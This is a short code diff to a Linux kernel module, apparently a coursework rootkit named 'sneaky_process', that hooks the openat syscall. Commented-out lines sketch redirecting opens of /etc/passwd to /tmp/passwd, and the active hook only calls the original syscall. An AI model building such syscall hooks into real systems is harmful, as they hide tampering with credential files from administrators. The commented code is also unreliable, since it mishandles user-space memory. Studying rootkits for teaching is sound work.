@@ -11,6 +11,7 @@
 #include <linux/types.h>
 
 #define PREFIX "sneaky_process"
+#define PASSWD "/etc/passwd"
 
 struct linux_dirent64 {
   unsigned long d_ino;      // inode number
@@ -52,7 +53,12 @@ asmlinkage int (*original_openat)(struct pt_regs *);
 
 // Define your new sneaky version of the 'openat' syscall
 asmlinkage int sneaky_sys_openat(struct pt_regs * regs) {
-  // Implement the sneaky part here
+  // unsigned long path_addr = regs->di;
+  // char * pathname = (char *)path_addr;
+  // if (strcmp(pathname, PASSWD) == 0) {
+  // copy_to_user(pathname, "/tmp/passwd", strlen("/tmp/passwd"));
+  // printk(KERN_INFO "find real passwd");
+  // }
   return (*original_openat)(regs);
 }
 
